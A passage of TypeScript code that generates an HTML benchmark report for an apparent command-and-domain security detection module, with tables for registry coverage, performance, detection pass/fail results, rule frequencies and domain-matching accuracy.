  critical: '#be123c', high: '#c2410c', medium: '#b45309',
  low: '#15803d', none: '#374151',
}

function riskBadge(risk: string): string {
  const color = RISK_COLOR[risk] ?? '#374151'
  return `<span style="background:${color};color:#fff;padding:2px 7px;border-radius:4px;font-size:11px;font-weight:700">${risk.toUpperCase()}</span>`
}

const passMark  = (p: boolean) => p ? '<span style="color:#15803d;font-weight:700">PASS</span>' : '<span style="color:#be123c;font-weight:700">FAIL</span>'

const html = `<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"/>
<title>Zocket Security Benchmark</title>
<style>
  @import url("https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap");
  :root{--p:#0088cc;--bg:#f4faff;--card:rgba(255,255,255,.92);--bdr:rgba(0,136,204,.18);--text:#1b2b37;--muted:#607889}
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:"Manrope","Segoe UI",sans-serif;background:var(--bg);color:var(--text);padding:32px}
  h1{font-size:22px;font-weight:800;margin-bottom:4px}
  h2{font-size:15px;font-weight:700;margin:28px 0 12px;color:var(--p)}
  .meta{color:var(--muted);font-size:13px;margin-bottom:28px}
  .stats{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:24px}
  .stat{background:var(--card);border:1px solid var(--bdr);border-radius:12px;padding:14px 20px;min-width:160px}
  .stat-val{font-size:26px;font-weight:800;color:var(--p)}
  .stat-lbl{font-size:12px;color:var(--muted);margin-top:2px}
  table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--bdr);border-radius:10px;overflow:hidden;font-size:13px;margin-bottom:20px}
  th{background:rgba(0,136,204,.08);text-align:left;padding:9px 12px;font-weight:700;font-size:12px;color:var(--muted);border-bottom:1px solid var(--bdr)}
  td{padding:8px 12px;border-bottom:1px solid rgba(0,136,204,.07);vertical-align:top}
  tr:last-child td{border-bottom:none}
  tr:hover td{background:rgba(0,136,204,.03)}
  .pass-row td{background:rgba(15,118,110,.03)}
  .fail-row td{background:rgba(190,18,60,.04)}
  code{font-family:monospace;font-size:11px;background:rgba(0,0,0,.06);padding:1px 5px;border-radius:3px}
  .bar-cell{min-width:120px}
  .bar{height:12px;border-radius:3px;background:linear-gradient(90deg,var(--p),#00a7ff);display:inline-block;vertical-align:middle}
</style>
</head><body>
<h1>Zocket Security Module Benchmark</h1>
<p class="meta">Date: ${new Date().toISOString().slice(0,10)} &nbsp;|&nbsp; Node.js ${process.version} &nbsp;|&nbsp; Detection tests: ${results.length} &nbsp;|&nbsp; Domain tests: ${domainTests.length}</p>

<div class="stats">
  <div class="stat"><div class="stat-val">${totalPass}/${results.length}</div><div class="stat-lbl">Detection tests pass</div></div>
  <div class="stat"><div class="stat-val">${totalProviders}</div><div class="stat-lbl">API providers in registry</div></div>
  <div class="stat"><div class="stat-val">${totalDomains}</div><div class="stat-lbl">Known domains</div></div>
  <div class="stat"><div class="stat-val">${(f1*100).toFixed(0)}%</div><div class="stat-lbl">Semantic F1 score</div></div>
  <div class="stat"><div class="stat-val">${analyzeCommandPerf ? Math.round(analyzeCommandPerf.opsPerSec/1000)+'k' : '—'}</div><div class="stat-lbl">analyzeCommand ops/sec</div></div>
</div>

<h2>1. API Registry Coverage</h2>
<table>
<tr><th>Category</th><th>Providers</th><th>Domains</th><th>Keywords</th><th>Bar</th></tr>
${Object.entries(CATEGORIES).map(([cat, names]) => {
  const entries = API_REGISTRY.filter(e => names.includes(e.name))
  const doms = entries.reduce((s,e) => s+e.domains.length, 0)
  const kws  = entries.reduce((s,e) => s+e.keywords.length, 0)
  const w = Math.round((entries.length / totalProviders) * 200)
  return `<tr><td>${cat}</td><td>${entries.length}</td><td>${doms}</td><td>${kws}</td><td class="bar-cell"><span class="bar" style="width:${w}px"></span></td></tr>`
}).join('\n')}
<tr><td><b>TOTAL</b></td><td><b>${totalProviders}</b></td><td><b>${totalDomains}</b></td><td><b>${totalKeywords}</b></td><td></td></tr>
</table>

<h2>2. Performance (50,000 iterations each)</h2>
<table>
<tr><th>Operation</th><th>ops/sec</th><th>ns/op</th><th>Bar</th></tr>
${perfResults.map(p => {
  const w = Math.round((p.opsPerSec / Math.max(...perfResults.map(x=>x.opsPerSec))) * 200)
  return `<tr><td>${p.label}</td><td>${p.opsPerSec.toLocaleString()}</td><td>${p.nsPerOp}</td><td class="bar-cell"><span class="bar" style="width:${w}px"></span></td></tr>`
}).join('\n')}
</table>

<h2>3. Detection Matrix (${totalPass}/${results.length} pass)</h2>
<table>
<tr><th>ID</th><th>Category</th><th>Scenario</th><th>Mode</th><th>Allowed</th><th>Risk</th><th>Rules Fired</th><th>Status</th></tr>
${results.map(r => `<tr class="${r.pass?'pass-row':'fail-row'}">
  <td><code>${r.tc.id}</code></td>
  <td>${r.tc.category}</td>
  <td>${r.tc.scenario}</td>
  <td><code>${r.tc.mode}</code></td>
  <td>${r.actual.allowed ? '✓ yes' : '✗ no'}</td>
  <td>${riskBadge(r.actual.risk)}</td>
  <td>${r.actual.rules.map(rule => `<code>${rule}</code>`).join(' ') || '—'}</td>
  <td>${passMark(r.pass)}${r.failures.length ? `<br><small style="color:#be123c">${r.failures.join('<br>')}</small>` : ''}</td>
</tr>`).join('\n')}
</table>

<h2>4. Rule Firing Frequency</h2>
<table>
<tr><th>Rule</th><th>Count</th><th>Freq</th><th>Bar</th></tr>
${sortedRules.map(([rule, count]) => {
  const pct = ((count / results.length)*100).toFixed(0)
  const w = Math.round((count / maxCount) * 200)
  return `<tr><td><code>${rule}</code></td><td>${count}</td><td>${pct}%</td><td class="bar-cell"><span class="bar" style="width:${w}px"></span></td></tr>`
}).join('\n')}
</table>

<h2>5. Score Distribution</h2>
<table>
<tr><th>Score Range</th><th>Count</th><th>Bar</th></tr>
${Object.entries(scoreGroups).map(([label, count]) => {
  const w = Math.round((count / maxSG) * 200)
  return `<tr><td>${label}</td><td>${count}</td><td class="bar-cell"><span class="bar" style="width:${w}px"></span></td></tr>`
}).join('\n')}
</table>

<h2>6. SUSPICIOUS_DOMAIN Semantic Matching (${domainRows.filter(r=>r.pass).length}/${domainRows.length} pass)</h2>
<table>
<tr><th>Test Case</th><th>Expected</th><th>Result</th><th>Status</th></tr>
${domainRows.map(row => {
  const res = !row.matched ? 'no-match' : row.ok ? 'ok' : 'MISMATCH'
  const resColor = res === 'MISMATCH' ? '#be123c' : res === 'ok' ? '#15803d' : '#607889'
  return `<tr class="${row.pass?'pass-row':'fail-row'}"><td>${row.label}</td><td><code>${row.expected}</code></td><td style="color:${resColor};font-weight:700">${res}</td><td>${passMark(row.pass)}</td></tr>`
}).join('\n')}
</table>
<p style="color:var(--muted);font-size:13px;margin-bottom:16px">
  Confusion Matrix (positive = flagged SUSPICIOUS): TP=${domainTP} TN=${domainTN} FP=${domainFP} FN=${domainFN}
  &nbsp;|&nbsp; Precision=${(precision*100).toFixed(1)}% &nbsp;|&nbsp; Recall=${(recall*100).toFixed(1)}% &nbsp;|&nbsp; F1=${(f1*100).toFixed(1)}%
</p>

</body></html>
`

writeFileSync('benchmark-security.html', html)
console.log('HTML written → benchmark-security.html')
console.log()
